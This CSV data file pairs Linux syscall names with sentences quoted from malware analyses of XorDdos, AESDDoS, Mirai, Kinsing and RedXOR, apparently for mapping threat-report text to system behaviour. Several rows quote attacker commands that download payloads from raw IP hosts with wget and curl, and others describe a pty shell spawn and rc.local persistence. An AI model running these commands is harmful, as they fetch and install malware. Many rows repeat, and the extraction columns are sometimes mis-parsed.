Syscall,Sentence,FirstLine,Synonym,SynonymSentence
read(),Exploits - takes advantage of a software vulnerability or security flaw and can be used to remotely access a network and gain elevated privileges,"<use to, remotely access a network and gain elevated privileges>","<,>",
read(),Screenshot of the randomly-named files the XorDdos rootkit extracts to the /usr/bin folder.,"<extract to, the /usr/bin folder.>","<,>",
readlink(),This Backdoor gathers the following data: CPU information Memory statistics IP address of infected machine Reads the following information from /proc:,"<gather,the following data: CPU information Memory statistics IP address of infected machine Reads the following information from /proc:>","<,>",
readlink(),it calls the readlink API with the first parameter as /proc/self/exe to fetch its full process path.,"<fetch,its full process path.>","<,>",
readlink(),The attackers are looking for more vulnerable machines on the same network as the infected machine.,"<look for,more vulnerable machines on the same network as the infected machine.>","<,>",
readlink(),however before it overwrites this file it first checks to see if it has already done so.,"<see,if it has already done so.>","<,>",
readlink(),"how this malware use socket to connect an IP, for example, since the code is too long. But to be noted, since ARM architecture has different structure than Intel, and ARM is designed for the embedded systems, you will see many different method for the detail operation that is involving with the system calls.","<use,socket to connect an IP>","<,>",
readlink(),hostos	Distribution	Extracted from /etc/issue or /etc/redhat-release,"<extracte,from /etc/issue or /etc/redhat-release>","<,>",
chmod(),A rootkit is a kernel module that hides the presence of malicious code by modifying kernel data structures.,"<modify,kernel data structures.>","<,>",
chmod(),"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”","<set,a new set of credentials and assigning its UID, GID to “0”>","<,>",
fchmod(),A rootkit is a kernel module that hides the presence of malicious code by modifying kernel data structures.,"<modify,kernel data structures.>","<,>",
fchmod(),"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”","<set,a new set of credentials and assigning its UID, GID to “0”>","<,>",
lchmod(),A rootkit is a kernel module that hides the presence of malicious code by modifying kernel data structures.,"<modify,kernel data structures.>","<,>",
lchmod(),"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”","<set,a new set of credentials and assigning its UID, GID to “0”>","<,>",
rename(),Figure 3. Code snippet showing XORDDoS’ capability to download and update files.,"<update,files.>","<,>",
rename(),"A string is formatted and the sed program is called which writes to the file in question (there are several string operations, such as sed -i -e '2 i%s/%s' /etc/rc.local is formatted for example).","<format,and the sed program is called which writes to the file in question.>","<,>",
rename(),"Trend Micro researchers also discovered that the latest variant of the AESDDoS bot can modify files i.e., /etc/rc.local and /etc/rc.d/rc.local","<modify,files i.e., /etc/rc.local and /etc/rc.d/rc.local>","<,>",
rename(),allowing attackers to overwrite the host runc binary and gain root-level code execution privileges.,"<overwrite,the host runc binary and gain root-level code execution privileges.>","<,>",
write(),"if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string.","<update,with a random 32-byte string.>","<,>",
write(),"A string is formatted and the sed program is called which writes to the file in question (there are several string operations, such as sed -i -e '2 i%s/%s' /etc/rc.local is formatted for example).","<format,and the sed program is called which writes to the file in question.>","<,>",
write(),"Trend Micro researchers also discovered that the latest variant of the AESDDoS bot can modify files i.e., /etc/rc.local and /etc/rc.d/rc.local","<modify,files i.e., /etc/rc.local and /etc/rc.d/rc.local>","<,>",
write(),allowing attackers to overwrite the host runc binary and gain root-level code execution privileges.,"<overwrite,the host runc binary and gain root-level code execution privileges.>","<,>",
write(),"The malware calls the subroutine daemon(__nochdir, __noclose) to set itself as a background daemon process, which internally calls fork() and setsid().","<set,itself as a background daemon process, which internally calls fork() and setsid().>","<,>",
setsid(),"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”","<assign,its UID, GID to “0”>","<,>",
sysinfo(),gather system information,"<gather,system information>","<,>",
sysinfo(),look for system information,"<look,for system information>","<,>",
sysinfo(),find linux kernel information,"<find,linux kernel information>","<,>",
uname(),gather system information,"<gather,system information>","<,>",
uname(),look for system information,"<look,for system information>","<,>",
uname(),find linux kernel information,"<find,linux kernel information>","<,>",
bind(),Hides the UDP4 connection by hooking /proc/net/udpHides the UDP6 connection by hooking /proc/net/udp6,"<hook,/proc/net/udpHides the UDP6 connection by hooking /proc/net/udp6>","<,>",
socket(),Hides the TCP4 connection by hooking /proc/net/tcpHides the TCP6 connection by hooking /proc/net/tcp6,"<hook,/proc/net/tcpHides the TCP6 connection by hooking /proc/net/tcp6>","<,>",
recv(),Miori has resurfaced using a text-based protocol to communicate with its command-and-control (C&C) rather than the customary use of binary-based protocol.,"<communicate,with its command-and-control (C&C) rather than the customary use of binary-based protocol.>","<,>",
recv(),The attacker communicates with a bot to SSH brute force a target device and download XorDdos.,"<download,XorDdos.>","<,>",
recv(),"inserts a function that is aimed to replace curl or wget, namely to download files from the web.","<wget,namely to download files from the web.>","<,>",
recv(),"inserts a function that is aimed to replace curl or wget, namely to download files from the web.","<curl,or wget, namely to download files from the web.>","<,>",
recvfrom(),encrypt its strings and to communicate with the command and control (C&C) server.,"<communicate,with the command and control (C&C) server.>","<,>",
recvfrom(),Code snippet showing XORDDoS’ capability to download and update files.,"<download,and update files.>","<,>",
recvfrom(),wget http://122.51.133.49:10086/VIP –O VIP,"<wget,http://122.51.133.49:10086/VIP –O VIP>","<,>",
recvfrom(),curl -o /tmp/russ http://106[.].246.224.219/russia.sh); ,"<curl,-o /tmp/russ http://106[.].246.224.219/russia.sh);>","<,>",
recvmsg(),encrypt its strings and to communicate with the command and control (C&C) server.,"<communicate,with the command and control (C&C) server.>","<,>",
recvmsg(),Code snippet showing XORDDoS’ capability to download and update files.,"<download,and update files.>","<,>",
recvmsg(),wget http://122.51.133.49:10086/VIP –O VIP,"<wget,http://122.51.133.49:10086/VIP –O VIP>","<,>",
recvmsg(),curl -o /tmp/russ http://106[.].246.224.219/russia.sh); ,"<curl,-o /tmp/russ http://106[.].246.224.219/russia.sh);>","<,>",
send(),transfer data to command and control server.,"<transfer,data to command and control server.>","<,>",
send(),encrypt its strings and to communicate with the command and control (C&C) server.,"<communicate,with the command and control (C&C) server.>","<,>",
send(),Code snippet showing XORDDoS’ capability to download and update files.,"<download,and update files.>","<,>",
send(),wget http://122.51.133.49:10086/VIP –O VIP,"<wget,http://122.51.133.49:10086/VIP –O VIP>","<,>",
send(),curl -o /tmp/russ http://106[.].246.224.219/russia.sh); ,"<curl,-o /tmp/russ http://106[.].246.224.219/russia.sh);>","<,>",
sendmsg(),transfer data to command and control server.,"<transfer,data to command and control server.>","<,>",
sendmsg(),encrypt its strings and to communicate with the command and control (C&C) server.,"<communicate,with the command and control (C&C) server.>","<,>",
sendmsg(),Code snippet showing XORDDoS’ capability to download and update files.,"<download,and update files.>","<,>",
sendmsg(),wget http://122.51.133.49:10086/VIP –O VIP,"<wget,http://122.51.133.49:10086/VIP –O VIP>","<,>",
sendmsg(),curl -o /tmp/russ http://106[.].246.224.219/russia.sh); ,"<curl,-o /tmp/russ http://106[.].246.224.219/russia.sh);>","<,>",
sendto(),transfer data to command and control server.,"<transfer,data to command and control server.>","<,>",
sendto(),encrypt its strings and to communicate with the command and control (C&C) server.,"<communicate,with the command and control (C&C) server.>","<,>",
sendto(),Code snippet showing XORDDoS’ capability to download and update files.,"<download,and update files.>","<,>",
sendto(),wget http://122.51.133.49:10086/VIP –O VIP,"<wget,http://122.51.133.49:10086/VIP –O VIP>","<,>",
sendto(),curl -o /tmp/russ http://106[.].246.224.219/russia.sh); ,"<curl,-o /tmp/russ http://106[.].246.224.219/russia.sh);>","<,>",
clone(),Mirai uses a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:,"<use,a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:>","<,>",
clone(),RedXOR uses an open-source LKM rootkit called “Adore-ng” to hide its process.,"<call,“Adore-ng” to hide its process.>","<,>",
clone(),"We'll see 3 thread will be spawned, which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw.","<spawn,which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw.>","<,>",
clone(),Then this main process will exit here. and forked to new process PID (note: If you go this far means the malware can infect your system).,"<fork,to new process PID (note: If you go this far means the malware can infect your system).>","<,>",
clone(),method involves running a bash script that performs the following activities via the command line:,"<perform,the following activities via the command line:>","<,>",
clone(),And the kinsing malware itself was installed at /etc/kinsing,"<install,at /etc/kinsing>","<,>",
clone(),SSH brute-force tool – the attacker added a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214),"<add,a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214)>","<,>",
clone(),The commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.,"<start,the daemon process at boot.>","<,>",
execve(),the malware constructs a shell command and then uses the system function to execute them,"<use,the system function to execute them>","<,>",
execve(),This is the function to be called when performing DoS by HTTP,"<call,when performing DoS by HTTP>","<,>",
execve(),"In the new spawned shell, the malware executes python -c “import pty;pty.spawn(‘/bin/sh’)” to get a pseudo-terminal (pty) interface.","<spawn,shell, the malware executes python -c “import pty;pty.spawn(‘/bin/sh’)” to get a pseudo-terminal (pty) interface.>","<,>",
execve(),The process then forks itself and breaks away from its parent by calling setsid(..).,"<fork,itself and breaks away from its parent by calling setsid(..).>","<,>",
execve(),The JSESSIONID value holds the command ID for the job the C2 wants the malware to perform.,"<perform,>","<,>",
execve(),"we saw that an attacker was able to exploit CVE-2019-3396 to infect machines with the AESDDoS botnet malware.” reads the analysis published by Trend Micro. “A shell command was remotely executed to download and execute a malicious shell script (Trojan.SH.LODEX.J), which in turn downloaded another shell script (Trojan.SH.DOGOLOAD.J) that finally installed the AESDDoS botnet malware on the affected system.","<install,the AESDDoS botnet malware on the affected system.>","<,>",
execve(),Persistence is achieved by the malware by adding to /etc/rc.local,"<add,to /etc/rc.local>","<,>",
execve(),bind it to the specific port (not random) TCP/48101 from localhost IP address 127.0.0.1 and then starting to listen to the incoming connection:,"<start,to listen to the incoming connection:>","<,>",
fork(),Mirai uses a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:,"<use,a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:>","<,>",
fork(),RedXOR uses an open-source LKM rootkit called “Adore-ng” to hide its process.,"<call,“Adore-ng” to hide its process.>","<,>",
fork(),"We'll see 3 thread will be spawned, which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw.","<spawn,which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw.>","<,>",
fork(),Then this main process will exit here. and forked to new process PID (note: If you go this far means the malware can infect your system).,"<fork,to new process PID (note: If you go this far means the malware can infect your system).>","<,>",
fork(),method involves running a bash script that performs the following activities via the command line:,"<perform,the following activities via the command line:>","<,>",
fork(),And the kinsing malware itself was installed at /etc/kinsing,"<install,at /etc/kinsing>","<,>",
fork(),SSH brute-force tool – the attacker added a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214),"<add,a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214)>","<,>",
fork(),The commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.,"<start,the daemon process at boot.>","<,>",
vfork(),Mirai uses a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:,"<use,a brute force technique for guessing passwords a.k.a. dictionary attacks based on the following list:>","<,>",
vfork(),RedXOR uses an open-source LKM rootkit called “Adore-ng” to hide its process.,"<call,“Adore-ng” to hide its process.>","<,>",
vfork(),"We'll see 3 thread will be spawned, which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw.","<spawn,which using ""/dev/null"" as value, this is typical MO for most types of AES.DDoS'ers we saw.>","<,>",
vfork(),Then this main process will exit here. and forked to new process PID (note: If you go this far means the malware can infect your system).,"<fork,to new process PID (note: If you go this far means the malware can infect your system).>","<,>",
vfork(),method involves running a bash script that performs the following activities via the command line:,"<perform,the following activities via the command line:>","<,>",
vfork(),And the kinsing malware itself was installed at /etc/kinsing,"<install,at /etc/kinsing>","<,>",
vfork(),SSH brute-force tool – the attacker added a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214),"<add,a new tool called hxx (md5=f0551696774f66ad3485445d9e3f7214)>","<,>",
vfork(),The commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.,"<start,the daemon process at boot.>","<,>",
exit_group(),Kill all current packeting.,"<,>","<,>",
exit_group(),"this fallback function also checks if cron, crond, and atd are active. if the first two work, then the function ends.","<end,>","<,>",
kill(),"It then kills all Telnet and SSH related processes, and connects with a C2 server to receive further commands.","<kill,all Telnet and SSH related processes, and connects with a C2 server to receive further commands.>","<,>",
kill(),"this fallback function also checks if cron, crond, and atd are active. if the first two work, then the function ends.","<end,>","<,>",
nanosleep(),The malware sleeps and tries to obtain the lock on the file again when it wakes up.,"<sleep,and tries to obtain the lock on the file again when it wakes up.>","<,>",
